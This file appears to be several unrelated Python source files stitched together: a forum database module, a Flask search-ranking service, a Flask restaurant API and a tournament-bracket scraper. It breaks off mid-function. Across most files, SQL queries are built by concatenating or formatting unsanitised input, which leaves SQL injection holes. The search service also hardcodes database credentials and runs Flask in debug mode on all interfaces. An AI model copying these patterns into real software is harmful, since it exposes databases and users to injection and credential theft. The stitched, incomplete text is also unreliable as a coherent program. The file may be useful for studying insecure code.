    for field_name in kwargs:
        setattr(self, field_name, kwargs[field_name])
        field = self._meta.get_field(field_name)
        value = field.get_db_prep_save(kwargs[field_name])
        if isinstance(value, basestring):                    
            value = "'%s'" % value.encode('utf-8').replace('\\', r'\\')                    
        elif isinstance(value, models.Model):                    
            value = str(value.id)                    
        elif value is None:                    
            value = 'NULL'                    
        else:                    
            value = str(value)                    
        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))                    
    sql.pop(-1) # Remove the last comma
    sql.extend(['WHERE', 'id', '=', str(self.id)])                    
    sql = ' '.join(sql)
    connection.cursor().execute(sql)                    
    transaction.commit_unless_managed()


update_fields.alters_data = True

# "Database code" for the DB Forum.

import datetime
import psycopg2

POSTS = [("This is the first post.", datetime.datetime.now())]


def get_posts():
    data_base = psycopg2.connect("dbname=forum")
    cursor = data_base.cursor()
    cursor.execute('select content, time from posts order by time desc')
    POSTS = cursor.fetchall()
    data_base.close()
    return POSTS


def add_post(content):
    data_base = psycopg2.connect("dbname=forum")
    cursor = data_base.cursor()
    cursor.execute("insert into posts values (%s)", (content,))                    
    data_base.commit()
    data_base.close()

from flask import Flask, request, jsonify
import time
import requests
import json

from TextProcessing import makeNGrams
from Ranking import Ranking

# for postgres index team
import psycopg2
import pprint

# for spoofing index
import random
random.seed(500)


app = Flask(__name__)


# Global psql connection vars
# connect to postgresql index team
conn_string = "host='green-z.cs.rpi.edu' dbname='index' user='ranking' password='ranking'"
conn = psycopg2.connect(conn_string)
conn.autocommit = True
cursor = conn.cursor()


# Receives the UI team's query and calls getRanking to get ranking results
# INPUT: User's query comes from "query" value in url 
# OUPUT: Returns the ranked list json to the front-end
@app.route('/search', methods=['GET'])
def recvQuery():

	print("in rec query")

	emptyRes = {}
	emptyRes["pages"] = []

	print(request.args.get('query'))

	query = request.args.get('query')

	if not query:
		return jsonify(emptyRes)


	query = query.lower()

	rankedList = getRanking(query)
	
	return jsonify(rankedList)


	


# Dummy endpoint for spoofing index service
@app.route('/index', methods=['POST'])
def spoofIndex():

	print(request.form)

	spoofFeatures = {}

	spoofFeatures['document_id'] = random.randint(1,10000)
	spoofFeatures['pagerank'] =	random.random()
	spoofFeatures['position'] = random.random()
	spoofFeatures['frequency'] = random.random()
	spoofFeatures['section'] = "body"
	spoofFeatures['date_created'] = "2018-11-05T16:18:03+0000"

	spoofDocuments = {}
	spoofDocuments["documents"] = []
	spoofDocuments["documents"].append(spoofFeatures)

	return jsonify(spoofDocuments)




# Takes in the user query, calls text processing and ranking layers to rank the query and returns a sorted ranked list
# INPUT: query - user's query string send from UI team
# OUTPUT: rankedList - sorted ranked list of documents 
def getRanking(query):
	
	# Call other file to get the n-grams
	ngrams = makeNGrams(query)
	print(ngrams)
	# create a ranking class to keep track of the ngram features
	ranking = Ranking()
	ids = set()

	for ngram in ngrams:
		# Send the nNgrams to the Index team to get the document features
		records = sendIndexReq( " ".join(ngram) )
		ranking.addNgram(records)

		for record in records:
			ids.add(record[1])

	# Get the additional statisitics based on the ids from the separate table
	additionalStatList = sendIndexDocumentReq(ids)
	for additionalStat in additionalStatList:
		ranking.addMoreStats(additionalStat)

	# Calculate the ranks within the ranking class
	rankedList = ranking.getDocuments()

	return rankedList


# Sends the database request to the index team to return the document features for the given ngram
# INPUT: ngram - string of the ngram
# OUTPUT: records - a list of tuples representing the statistics returned from the reverse inex from the index team
def sendIndexReq(nGram):
	

	try:
		print(nGram)
		sql = "SELECT * FROM index WHERE ngram='" + nGram + "';"                    

		cursor.execute(sql)                    
		records = cursor.fetchall()
	except Exception as ex:
		print(ex)

		return []


	return records

# Send the database request to the index team to get the document statistics for a set of document ids
# INPUT: ids - list of document ids as integers
# OUTPUT: records - a list of tuples representing the statistics returned from the database (id, pagerank, date_updated)
def sendIndexDocumentReq(ids):

	idStrList = ","
	idStrList = idStrList.join( list( map(str, ids) ) )

	try:

		sql = "SELECT id, pagerank, date_updated FROM documents WHERE id IN (" + idStrList + ");"
		# sql = "SELECT id, norm_pagerank, date_updated FROM documents WHERE id IN (" + idStrList + ");"
		cursor.execute(sql)                    
		records = cursor.fetchall()
	except Exception as ex:
		print(ex)
		return []

	return records



if __name__ == "__main__":
	# @TODO remove debug before production
	app.run(debug=True, host='0.0.0.0', port=5000)

from flask import Flask, request
from db import Database
from datetime import datetime, timedelta
from log import Logger
import sql_queries
import simplejson

logger = Logger().logger 
app = Flask(__name__)
port_number = 40327

database = Database()

cuisine_discovery_cache = {}
unique_ingredients_cache = {}
cache_persistence_time = timedelta(days=1)

geodist = 0.12  # used for restaurant geosearching - defines L1 radius

@app.before_request                    
def log_request():                    
    return  # TODO: add request logger


@app.route('/')
def index():
    return app.send_static_file('TheFoodCourt.html')


@app.route('/ingredient_prefix/<string:prefix>')
def get_ingredient_by_prefix(prefix):
    query_res = database.find_ingredients_by_prefix(prefix)
    if query_res == -1:
        return None
    logger.info("GET get_ingredient_by_prefix query")
    return query_res


@app.route('/get_cuisines')
def get_cuisines():
    query_res = database.get_cuisines()
    if query_res == -1:
        return None
    logger.info("GET get_cuisines query")
    return query_res


@app.route('/discover_new_cuisines/<int:cuisine_id>')
def discover_new_cuisines(cuisine_id):
    logger.info("GET discover_new_cuisines query")
    if cuisine_id in cuisine_discovery_cache:
        insert_time, data = cuisine_discovery_cache[cuisine_id]
        if datetime.now() < insert_time + cache_persistence_time:
            return data

    query_res = database.discover_new_cuisines_from_cuisine(cuisine_id)
    if query_res == -1:
        return None
    cuisine_discovery_cache[cuisine_id] = (datetime.now(), query_res)
    return query_res


@app.route('/restaurants/<ingredient>/')
def query_restaurants_by_ingredient(ingredient):
    """
    To query this method, use :
    '/restaurants/<ingredient>/?key=value&key=value&...' where keys are optional
    strings from ['loclat', 'loclng', 'price_category', 'online_delivery', 'min_review']
    for example: '/restaurants/flour/?min_review=3.5&price_category=2'
    """
    logger.info("GET query_restaurants_by_ingredient query")
    loclat, loclng = request.args.get('loclat'), request.args.get('loclng')
    price_category = request.args.get('price_category')
    online_delivery = request.args.get('online_delivery')
    min_review = request.args.get('min_review')
    base_query = sql_queries.restaurants_by_ingredient % ingredient
    if loclat != None and loclng != None:
        lat_range = [float(loclat) - geodist, float(loclat) + geodist]                    
        lng_range = [float(loclng) - geodist, float(loclng) + geodist]                    
    else:
        lat_range = None
        lng_range = None
    filtered_query = database.restaurant_query_builder(base_query,
                                                       lat_range, lng_range,
                                                       price_category,
                                                       min_review, online_delivery)
    limited_query = database.order_by_and_limit_query(filtered_query,
                                                    "agg_review DESC", 20)
    query_res = database.run_sql_query(limited_query)
    if query_res == -1:
        return None
    return query_res


@app.route('/restaurants/<saltiness>/<sweetness>/<sourness>/<bitterness>/')
def query_restaurants_by_taste(saltiness, sweetness, sourness, bitterness):
    """
    To query this method, use :
    '/restaurants/<saltiness>/<sweetness>/<sourness>/<bitterness>/?key=value&key=value&...'
    where keys are optional strings from
    ['loclat', 'loclng', 'price_category', 'online_delivery', 'min_review']
    and tastes (e.g. 'saltiness') are either 0 or 1
    for example: '/restaurants/0/1/0/1/?min_review=3.5&price_category=2'
    """
    logger.info("GET query_restaurants_by_taste query")
    try:
        saltiness, sweetness, sourness, bitterness = int(saltiness), \
                                                     int(sweetness), \
                                                     int(sourness), int(bitterness)
    except:
        return None

    restaurant_query = sql_queries.restaurant_by_taste % (
        get_taste_condition(saltiness),
        get_taste_condition(sweetness),
        get_taste_condition(sourness),
        get_taste_condition(bitterness),
        get_taste_condition(1 - saltiness),
        get_taste_condition(1 - sweetness),
        get_taste_condition(1 - sourness),
        get_taste_condition(1 - bitterness),
    )
    loclat, loclng = request.args.get('loclat'), request.args.get('loclng')
    price_category = request.args.get('price_category')
    online_delivery = request.args.get('online_delivery')
    min_review = request.args.get('min_review')
    if loclat != None and loclng != None:
        lat_range = [float(loclat) - geodist, float(loclat) + geodist]                    
        lng_range = [float(loclng) - geodist, float(loclng) + geodist]                    
    else:
        lat_range = None
        lng_range = None
    filtered_query = database.restaurant_query_builder(restaurant_query,
                                                       lat_range, lng_range,
                                                       price_category,
                                                       min_review, online_delivery)
    limited_query = database.order_by_and_limit_query(filtered_query,
                                                    "agg_review DESC", 20)
    query_res = database.run_sql_query(limited_query)
    if query_res == -1:
        return None
    return query_res


def get_taste_condition(value):
    if value == 1:
        return "0.6 AND 1"
    else:
        return "0.0 AND 0.4"


@app.route('/unique_ingredients/<cuisine_id>')
def find_unique_ingredients_from_cuisine(cuisine_id):
    logger.info("GET find_unique_ingredients_from_cuisine query")
    if cuisine_id in unique_ingredients_cache:
        insert_time, data = unique_ingredients_cache[cuisine_id]
        if datetime.now() < insert_time + cache_persistence_time:
            return data

    try:
        cuisine_id_int = int(cuisine_id)
    except:
        logger.error("Error translating cuisine_id to int in "
                     "find_unique_ingredients_from_cuisine, passed value: "
                     "%s" % cuisine_id)
        return None

    query_res = database.find_unique_ingredients_of_cuisine(cuisine_id_int, 500)
    if query_res == -1:
        return None
    if len(simplejson.loads(query_res)) == 0:  # try again with smaller filter
        query_res = database.find_unique_ingredients_of_cuisine(cuisine_id_int,
                                                                250)
        if query_res == -1:
            return None
        unique_ingredients_cache[cuisine_id] = (datetime.now(), query_res)
        return query_res
    else:
        unique_ingredients_cache[cuisine_id] = (datetime.now(), query_res)
        return query_res


@app.route('/new_franchise/<lat>/<lng>')
def set_up_new_franchise(lat, lng):
    try:
        lat, lng = float(lat), float(lng)
    except:
        logger.error("Error translating location to floats in "
                     "set_up_new_franchise, passed values: "
                     "lat: %s, lng: %s" % (lat, lng))

    query_res = database.set_up_new_franchise(lat, lng, 0.015)
    if query_res == -1:
        return None
    return query_res


@app.route('/get_common_ingredients_with/<ingredient>')
def get_common_ingredients_with(ingredient):
    result = database.query_common_ingredients_with(ingredient)
    if result == -1:
        return None
    else:
        return result


if __name__ == '__main__':
    app.run(port=port_number)

from time import sleep
import operator
from bs4 import BeautifulSoup
from requests import get
import constants
import logger
import re
import os
import pickle
import pysmash
from get_results import get_coalesced_tag
import datetime

DEFAULT_BASE_URLS = ['https://challonge.com/NP9ATX###', 'http://challonge.com/heatwave###', 'https://austinsmash4.challonge.com/atx###',\
        'http://challonge.com/RAA_###']

debug = False
LOG = logger.logger(__name__)

def _get_first_valid_url(base_url):

    #Start from 1, and increment the number at the end or URL until we find a valid URL
    valid = False
    index = 1
    while(not valid):                    
        url = base_url.replace('###', str(index))
        data, status = hit_url(url)

        if status < 300 and is_valid(data, url=base_url):
            if debug: print('url ' + url + ' is valid')
            valid = True
        else:
            if debug: print('url ' + url + ' is not valid')
            index = index + 1

    return index                    

def _get_last_valid_url(base_url, start=1):

    #We know that URL number 'start' is valid. What is the next invalid URL?
    invalid_count = 0
    end = start #Use this to keep track of the last valid URL

    #Sometimes a week is skipped -- Make sure we see 100 invalid URLs in a row before calling it quits
    while(invalid_count <= 30):
        #if base_url == "https://austinsmash4.challonge.com/atx145":
        #    print
        url = base_url.replace('###', str(start))
        print('about to check url {}'.format(url))
        if debug: print('start is ' + str(start))

        data, status = hit_url(url)

        if status < 300  and is_valid(data, url=base_url):
            if debug: print('url ' + str(url) + ' is valid')
            invalid_count = 0
            end = start
        else:
            invalid_count = invalid_count + 1

        start = start + 1
    return end

def get_valid_url_range(base_url):
    # Try to get this data form pickle
    start_end = load_pickle_data(base_url)
    if start_end:
        start, end = start_end

        # See if there have been new brackets since we pickled this data
        end = _get_last_valid_url(base_url, end)

    else:
        start = _get_first_valid_url(base_url)
        end = _get_last_valid_url(base_url, start)

    dump_pickle_data(base_url, (start,end))

    return start, end

def dump_pickle_data(base_fname, data):
    cwd = os.getcwd()

    # Go from https://ausin_melee_bracket -> austin_melee_bracket
    bracket_name = base_fname.replace('/', '_')
    fname = cwd+'/pickle/'+str(bracket_name)+'.p'

    with open(fname, "wb") as p:
        pickle.dump(data, p)

def load_pickle_data(base_fname):
    if debug: print('attempting to get pickle data for ', base_fname)
    # Attempt to get data from pickle
    cwd = os.getcwd()

    # Go from https://ausin_melee_bracket -> austin_melee_bracket
    bracket_name = base_fname.replace('/', '_')
    fname = cwd+'/pickle/'+str(bracket_name)+'.p'
    LOG.info('attempting to load pickle data for {}'.format(fname))

    try:
        with open(fname, 'rb') as p:
            data = pickle.load(p)
            return data

    except FileNotFoundError:
        LOG.info('could not load pickle data for {}'.format(fname))
        if debug: print('failed to get pickle data for ', base_fname)
        return None

def hit_url(url, load_from_cache=True):
    # Before we try to hit this URL, see if we have pickle data for it

    if load_from_cache:
        data =  load_pickle_data(url)
        if data:
            return data, 200

    #sleep, to make sure we don't go over our rate-limit
    sleep(.02)

    #Get the html page
    r = get(url)
    data = r.text

    if(is_valid(data, url=url) and load_from_cache):
        # Make sure we pickle this data, so we can get it next time
        dump_pickle_data(url, data)

    return data, r.status_code

def get_brackets_from_user(scene_url, total=None, pages=None):
    # Given the url for a given scene (https://austinsmash4.challonge.com)
    # Return all of the brackets hosted by said scene

    # 'total' is number of brackets to get. If None, get all. Usually either None or 1

    def get_bracket_urls_from_scene(scene_url, load_from_cache=True):
        # Given a specific page of a scene, parse out the urls for all brackets
        # eg inputhttps://austinsmash4.challonge.com?page=4
        # The above URL contains a list of brackets. Find those bracket URLs
        scene_brackets_html, status = hit_url(scene_url, load_from_cache=load_from_cache)
        scene_name = scene_url.split('https://')[-1].split('.')[0]
        soup = BeautifulSoup(scene_brackets_html, "html.parser")

        links = soup.find_all('a')
        bracket_links = []
        for link in links:
            if link.has_attr('href') and scene_name in link['href']:
                # Make sure this is a real bracket
                html = get_bracket(link['href'])
                if html and is_valid(html, url = link['href']):
                    bracket_links.append(link['href'])

                    # If we have more than 'total' links, we can return them now
                    if total and len(bracket_links) >= total:
                        return bracket_links
        return bracket_links

    # This scene may have multiple pages.
    # eg, https://austinsmash4.challonge.com?page=###
    # Find all the pages
    # Then find all the URLs for each page
    scene_url_with_pages = scene_url + '?page=###'
    start, end = get_valid_url_range(scene_url_with_pages)
    brackets = []
    for i in range(start, end+1):
        # It is possible that page 1 has changed since last time we checked. Don't load this page from cache
        cache = i > 1
        scene_url = scene_url_with_pages.replace('###', str(i))
        page_brackets = get_bracket_urls_from_scene(scene_url, cache)
        brackets.extend(page_brackets)

        # If we have more than 'total' links, we can return them now
        if total and len(brackets) >= total:
            return brackets

        # If we have already gotten urls from 'pages' pages, we can return now
        iterations = (start - i) + 1
        if pages and iterations >= pages:
            return brackets

    # Reverse this list so list[0] is the oldest bracket, and list[-1] is the newest bracket
    return brackets[::-1]

def is_valid(html, url=None):

    #Check to see if this tournament page exists
    errors= ['The page you\'re looking for isn\'t here', 'No tournaments found',\
            "Internal Server Error",
            "Not Implemented",
            "Bad Gateway",
            "Gateway Time-out",
            "Gateway Timeout",
            "Service Unavailable",
            "Gateway Timeout",
            "HTTP Version Not Supported",
            "Variant Also Negotiates",
            "Insufficient Storage",
            "Loop Detected",
            "Not Extended",
            "Network Authentication Required"]
    for error in errors:
        if error.lower() in str(html).lower():
            if debug:
                print('page invalid, found error string {}'.format(error))
            return False

    # If we are on a bracket, we need to make sure it is complete.
    # But, this might be a users page, eg. https://challonge.com/users/kuya_mark96
    # If that is the case, we shouldn't check for completeness
    if 'member since' in str(html).lower():
        return True

    # It may also be a page like this... http://smashco.challonge.com
    # Which is similar to a users page. Also don't check for completeness
    if 'organizations' in str(html).lower():
        return True

    # This might be a 'standings' page, like https://challongw.com/RAA_1/standings
    if url and 'standings' in url:
        return True

    return bracket_complete(html)


def bracket_complete(data):
    # Are there any matches that haven't been played yet?
    if "player1" not in data.lower() and "player2" not in data.lower():
        if debug:
            print('didnt find any players, must be invalid')
        return False
    if '"player1":null' in data.lower() or '"player2":null' in data.lower():
        if debug:
            print('found a null player, must be invalid')
        return False

    return True
    
def get_bracket(url):
    if debug:
        print('about to get bracket for url {}'.format(url))

    data, status = hit_url(url)

    # Create the Python Object from HTML
    soup = BeautifulSoup(data, "html.parser")

    # the bracket is inside a 'script' tag
    script = soup.find_all('script')
    bracket = None
    for s in script:
        if 'matches_by_round' in str(s):
            #We found the actual bracket. S contains all data about matches
            index = str(s).index('matches_by_round')
            s = str(s)[index:]
            bracket = (s)

    if debug: print('got bracket: \n', bracket)

    return bracket

def get_sanitized_bracket(url, symbol="{}"):
    bracket = get_bracket(url)
    sanitized = sanitize_bracket(bracket, symbol) if bracket else None
    return sanitized

def sanitize_bracket(bracket, symbol="{}"):
    #Which symbol should we be trying to match on? It will be either () or {}
    opn = symbol[0]
    close = symbol[-1]

    index = bracket.index(opn)

    #Cut off everything up until the first open bracket
    bracket = bracket[index:]

    #use a queue to cut off everything after the aligning close bracket
    count = 0
    for i, letter in enumerate(bracket):
        if letter == opn:
            count = count + 1
        if letter == close:
            count = count - 1

            #Also check to see if this is the final closing bracket
            if count == 0:
                index = i
                break

    bracket = bracket[:index+1]
    return bracket

def get_tournament_placings(bracket_url):
    # Map tags to their respective placings in this bracket
    placings_map = {}

    if 'challonge' in bracket_url:
        LOG.info('just entering "get tournament palcings')
        standings_html, status = hit_url(bracket_url+'/standings')
        soup = BeautifulSoup(standings_html, "html.parser")
        tds = soup.find_all('td')

        # Cycle thorugh these tds, and find the ones that represent different placings
        current_placing = 1
        for td in tds:
            if td.has_attr('class') and td['class'][0] == 'rank':
                current_placing = int(td.getText())
            span = td.find('span')
            # Player tags are kept in <span> elements
            if span:
                player = span.getText()

                # Coalesce tags
                player = get_coalesced_tag(player)
                placings_map[player.lower()] = current_placing
                LOG.info('just got placing {} for player {} in bracket {}'.format(current_placing, player, bracket_url))

    # This bracket is from smashgg
    else:
        smash = pysmash.SmashGG()
        url_parts = bracket_url.split('/')

        if 'tournament' in url_parts and 'events' in url_parts:
            t = url_parts[url_parts.index('tournament')+1]
            e = url_parts[url_parts.index('events')+1]
            players = smash.tournament_show_players(t, e)
            for player_dict in players:
                tag = player_dict['tag']
                # sanitize the tag
                tag = ''.join([i if ord(i) < 128 else ' ' for i in tag])
                place = player_dict['final_placement']
                placings_map[tag.lower()] = place

    return placings_map

def player_in_url(db, player, urls):                    

    sql = "SELECT * FROM matches WHERE (player1='{}' or player2='{}')".format(player, player, urls)
    if len(urls) > 0:
        sql = sql + " and (url='{}'".format(urls[0])
        for url in urls[1:]:
            sql = sql + " or url='{}'".format(url)
        sql = sql + ");"
    res = db.exec(sql)                    

    if len(res) > 0:
        return True
    LOG.info('player {} is not in {}'.format(player, urls))
    return False

def player_in_bracket(player, bracket=None):
    # Make sure to add quotations around the tag
    # this way, we ony match on actual tags, and not *tag*
    #player = '<title>'+player+'</title>'

    # This player may have multiple tags
    # Check if any of them are in the bracket
    tags = get_coalesce_tags(player)
    for tag in tags:
        if re.search(tag, bracket, re.IGNORECASE):
            return True
    return False

def get_coalesce_tags(player):
    for tags in constants.TAGS_TO_COALESCE:
        if player in tags:
            return tags
    # If this tag does not need to be coalesced, just return a list of this
    return [player]

def get_urls_with_players(players=["Christmas Mike", "christmasmike"], base_urls=DEFAULT_BASE_URLS):
    urls = []
    for base in base_urls:
        start, end = get_valid_url_range(base)
        for i in range(start, end+1):
            bracket_url = base.replace('###', str(i))
            bracket = get_sanitized_bracket(bracket_url)
            for player in players:
                if bracket and player_in_bracket(player, bracket=bracket):
                    urls.append(bracket_url)
                    break
    return urls

def get_list_of_scenes():
    austin = constants.AUSTIN_URLS                    
    smashbrews = constants.SMASHBREWS_RULS                    
    colorado = constants.COLORADO_SINGLES_URLS                    
    colorado_doubles = constants.COLORADO_DOUBLES_URLS                    
    sms = constants.SMS_URLS                    
    base_urls = [sms, smashbrews, austin, colorado_doubles, colorado]                    
    return base_urls                    

def get_list_of_named_scenes():
    austin = constants.AUSTIN_URLS                    
    smashbrews = constants.SMASHBREWS_RULS                    
    colorado_singles = constants.COLORADO_SINGLES_URLS
    colorado_doubles = constants.COLORADO_DOUBLES_URLS                    
    sms = constants.SMS_URLS                    
    base_urls = [['sms', sms], ['smashbrews', smashbrews], ['austin', austin], ['colorado', colorado_singles], ['colorado_doubles', colorado_doubles]]
    return base_urls                    

def get_list_of_scene_names():
    return ['sms', 'austin', 'smashbrews', 'colorado', 'colorado_doubles', 'pro', 'pro_wiiu', 'test1', 'test2']

def get_last_n_tournaments(db, n, scene):
    today = datetime.datetime.today().strftime('%Y-%m-%d')
    return get_n_tournaments_before_date(db, scene, today, n)

def get_first_month(db, scene):
    sql = "select date from matches where scene='{}' order by date limit 1;".format(scene)                    
    res = db.exec(sql)                    
    date = res[0][0]
    return date

def get_next_month(date):
    y, m, d = date.split('-')
    m = '01' if m == '12' else str(int(m)+1).zfill(2)
    y = str(int(y)+1).zfill(2) if m == '01' else y
    date = '{}-{}-{}'.format(y, m, d)
    return date

def get_previous_month(date):
    y, m, d = date.split('-')
    m = '12' if m == '01' else str(int(m) - 1).zfill(2)
    y = str(int(y) - 1).zfill(2) if m == '12' else y
    date = '{}-{}-{}'.format(y, m, d)
    return date

def get_last_month(db, scene):
    sql = "select date from matches where scene='{}' order by date desc limit 1;".format(scene)                    
    res = db.exec(sql)                    
    date = res[0][0]

    # If it has been more than 1 month since this last tournament,
    # go ahead and round this date up by a 1 month
    # eg, if the last tournament was 2015-01-15 (a long time ago)
    # we can assume the scene won't have more tournaments
    # So just round to 2015-02-01
    today = datetime.datetime.today().strftime('%Y-%m-%d')
    y, m, d = today.split('-')
    cy, cm, cd = date.split('-')
    if y > cy or m > cm:
        # Add 1 to the month before we return
        # eg 2018-03-01 -> 2018-04-01
        date = get_next_month(date)

    return date

def get_first_ranked_month(db, scene, player):
    sql = "select date from ranks where scene='{}' and player='{}' order by date limit 1;".format(scene, player)                    
    res = db.exec(sql)                    
    date = res[0][0]
    return date

def get_last_ranked_month(db, scene, player):
    sql = "select date from ranks where scene='{}' and player='{}' order by date desc limit 1;".format(scene, player)                    
    res = db.exec(sql)                    
    date = res[0][0]
    return date

def iter_months(first, last, include_first=True, include_last=False):
    # Both first and last are date strings in the format yyyy-mm-dd

    y, m, d = first.split('-')
    last_y, last_m, last_d = last.split('-')
    cur = '{}-{}'.format(y, m)
    last = '{}-{}'.format(last_y, last_m)

    # Calculate ranks on the first of every month between first and last
    months = []
    if include_first:
        months.append('{}-01'.format(cur))


    op = operator.ge if include_last else operator.gt
    while op(last, cur):
        m = str(int(m) + 1)

        if m == '13':
            m = '01'
            y = str(int(y) + 1)

        # Make sure to pad the month with 0s
        m = m.zfill(2)
        cur = '{}-{}'.format(y, m)
        months.append('{}-01'.format(cur))

    # We don't actually want to include this last month.
    # Eg. if the last tournament was played on 2018-02-04, we don't want to calculate the ranks
    # For Feb. until March starts

    return months[:len(months)-1]

def has_month_passed(date):
    y, m, d = date.split('-')
    today = datetime.datetime.today().strftime('%Y-%m-%d')
    today_y, today_m, today_d = today.split('-')

    # Are these two in the same month?
    if m == today_m:
        return False

    # Otherwise, we know that 'date' is in the past, and 'today' is current.
    # We must be in a new month now. Always rank on the 1st
    if today_d == '01':
        return True

    return False

def get_monthly_ranks_for_scene(db, scene, tag):

    sql = "SELECT date, rank FROM ranks WHERE scene='{}' AND player='{}'".format(scene, tag)                    
    res = db.exec(sql)                    

    res = [r for r in res if played_during_month(db, scene, tag, get_previous_month(r[0]))]

    # Build up a dict of {date: rank}
    ranks = {}
    for r in res:
        ranks[r[0]] = r[1]

    return ranks

def get_ranking_graph_data(db, tag):
    # First, we have to find out which scenes this player is ranked in
    sql = "SELECT DISTINCT scene FROM ranks WHERE player='{}'".format(tag)                    
    scenes = db.exec(sql)                    
    scenes = [s[0] for s in scenes]

    # Get the first time we were ranked in each of these scenes
    first_months = [get_first_ranked_month(db, s, tag) for s in scenes]
    last_months = [get_last_ranked_month(db, s, tag) for s in scenes]

    first_month = min(first_months)
    last_month = max(last_months)

    # Get a list of each month that we want to know the ranks for
    iterated_months = iter_months(first_month, last_month, include_last=True)

    # Get individual rankings per month, per scene
    arank = get_monthly_ranks_for_scene(db, 'austin', 'christmasmike')                    

    monthly_ranks_per_scene = {s:get_monthly_ranks_for_scene(db, s, tag) for s in scenes}

    ranks_per_scene = {s:[] for s in scenes}
    # Reformat this data to use with Zing
    for month in iterated_months:
        for s in scenes:
            scene_ranks = monthly_ranks_per_scene[s]
            if month in scene_ranks:
                ranks_per_scene[s].append([month, scene_ranks[month]])

    

    return ranks_per_scene, iterated_months

def get_bracket_placings_in_scene(db, scene, tag):
    sql = "select distinct matches.date, placings.place from placings join matches on \
            matches.url=placings.url where scene='{}' and ((player1='{}' and placings.player=player1) or \                    
            (player2='{}' and placings.player=player2));".format(scene, tag, tag)                    
    print(sql)                    
    res = db.exec(sql)                    

    # Convert all placings to ints
    res = [[r[0], int(r[1])] for r in res]
    return res

def get_bracket_graph_data(db, tag):
    # First, we have to find out which scenes this player has brackets in
    sql = "SELECT DISTINCT scene FROM ranks WHERE player='{}'".format(tag)                    
    scenes = db.exec(sql)                    
    scenes = [s[0] for s in scenes]

    bracket_placings_by_scene = {s: get_bracket_placings_in_scene(db, s, tag) for s in scenes}

    return bracket_placings_by_scene


def get_tournaments_during_month(db, scene, date):
    y, m, d = date.split('-')
    ym_date = '{}-{}'.format(y, m)
    sql = "select url, date from matches where scene='{}' and date like '%{}%' group by url, date order by date".format(scene, ym_date)                    
    res = db.exec(sql)                    
    urls = [r[0] for r in res]
    return urls

def played_during_month(db, scene, tag, date):
    # First, which tournaments were hosted during this month?
    tournaments = get_tournaments_during_month(db, scene, date)

    if player_in_url(db, tag, urls=tournaments):                    
        return True

    return False

def get_n_tournaments_before_date(db, scene, date, limit):
    sql = "select url, date from matches where scene='{}' and date<='{}' group by url, date order by date desc limit {};".format(scene, date, limit)                    
    res = db.exec(sql)                    
    urls = [r[0] for r in res]
    return urls, date

def get_n_tournaments_after_date(db, scene, date, limit):
    sql = "select url, date from matches where scene='{}' and date>='{}' group by url, date order by date desc limit {};".format(scene, date, limit)                    
    res = db.exec(sql)                    
    urls = [r[0] for r in res]
    return urls, date

def get_date(url):
    url = url + "/log"
    bracket, status = hit_url(url)

    # TODO figure out what to do if this string is not in
    s2 = '2015-03-07'
    if 'created_at' not in bracket:
        return s2

    first_occurance = str(bracket).index('created_at')
    bracket = bracket[first_occurance:]

    #TODO if one day this code randomly stop working, it's probably this
    s = 'created_at":"'
    i = len(s)
    i2 = len(s2) + i
    date = bracket[i:i2]
    y = date.split('-')[0]
    m = date.split('-')[1]
    d = date.split('-')[2]

    return date

def get_matches_from_urls(db, urls):
    matches = set()
    for url in urls:
        sql = "SELECT * FROM matches WHERE url='{}';".format(url)                    
        res = set(db.exec(sql))                    
        matches |= set(res)

    return matches

def get_display_base(url, counter=None):
    # Try to get the title of this challonge page, maybe the creator gave it a good display name
    if 'challonge' in url:
        html, _ = hit_url(url)
        soup = BeautifulSoup(html, "html.parser")

        display_name = soup.find('div', {'id' :'title'})
        if display_name and hasattr(display_name, 'title'):
            title = display_name.text.rstrip().lstrip()
            name = re.sub("[^a-z A-Z 0-9 # / \ .]",'', title)
            return name
        else:
            LOG.info('url {} has no title'.format(url))

        # We couldn't find the title in a div. It may be in an h1
        display_name = soup.find('h1', {'class': 'title'})
        if display_name:
            name = display_name.find(text=True).lstrip().rstrip()
            LOG.info('just found new title for url: {} - {}'.format(url, name))

            return name

    # We couldn't find a title in the HTML. See if we have a hard-coded one
    d_map = constants.DISPLAY_MAP
    for k in d_map:
        if  k.lower() in url.lower():
            base = d_map[k]
            if counter:
                name = '{} {}'.format(base, counter)
                return name
            return base
    
    # If this is a pro bracket, just pull the name out of the URL
    if 'smash.gg' in url:
        parts = url.split('event')[0].split('/')[-2].split('-')
        display_list = [s.title() for s in parts]
        return ' '.join(display_list)

    # None of the above methods worked. Just call this by its URL
    return url

def get_smashgg_brackets(pages=None, all_brackets=True, singles=True, scene='pro'):
    results = 0
    per_page = 5
    page = 1 if pages == None else pages[0]
    brackets = {}
    smash = pysmash.SmashGG()

    def iterate():
        print('PAGE {}'.format(page))
        # melee
        #results_url = 'https://smash.gg/results?per_page=5&filter=%7B%22completed%22%3Atrue%2C%22videogameIds%22%3A%221%22%7D&page={}'.format(page)
        results_url = "https://smash.gg/tournaments?per_page=30&filter=%7B%22upcoming%22%3Afalse%2C%22videogameIds%22%3A4%2C%22past%22%3Atrue%7D&page={}".format(page)
        
        #wiiu
        #results_url = 'https://smash.gg/results?per_page=5&filter=%7B%22completed%22%3Atrue%2C%22videogameIds%22%3A3%7D&page={}'.format(page)

        #Get the html page
        r = get(results_url)
        data = r.text
        soup = BeautifulSoup(data, "html.parser")
        grep = 'singles' if singles else 'doubles'
        #print(data)

        links = soup.find_all('a')
        for link in links:
            try:
                if link.has_attr('href') and 'tournament' in link['href']:
                    url_parts = link['href'].split('/')

                    t = url_parts[url_parts.index('tournament')+1]
                    if t in brackets:
                        continue

                    events = smash.tournament_show_events(t)
                    def get_event(events, matches):
                        # Do we have a melee singles event?
                        for e in events['events']:
                            if all([match in e for match in matches]):
                                return e
                                
                        return None

                    if scene=='pro_wiiu':
                        e = get_event(events, ['wii', 'single'])
                        if e == None:
                            e = get_event(events, ['single'])
                        if e == None:
                            e = get_event(events, ['wii'])
                        if e == None:
                            e = get_event(events, ['smash-4'])
                        if e == None:
                            e = get_event(events, ['smash4'])
                        if e == None:
                            e = get_event(events, ['smash'])
                        if e == None:
                            continue

                    elif scene=='pro':
                        e = get_event(events, ['melee', 'single'])
                        if e == None:
                            e = get_event(events, ['single'])
                        if e == None:
                            e = get_event(events, ['gamecube'])
                        if e == None:
                            e = get_event(events, ['melee'])
                        if e == None:
                            e = get_event(events, ['smash'])
                        if e == None:
                            continue

                    url = 'https://smash.gg/tournament/{}/events/{}'.format(t, e)
                    brackets[t] = url
                    with open('threaded_smash_gg_brackets.txt', 'a') as f:
                        f.write('PAGE{}[[{}]]\n'.format(page, url))

                    
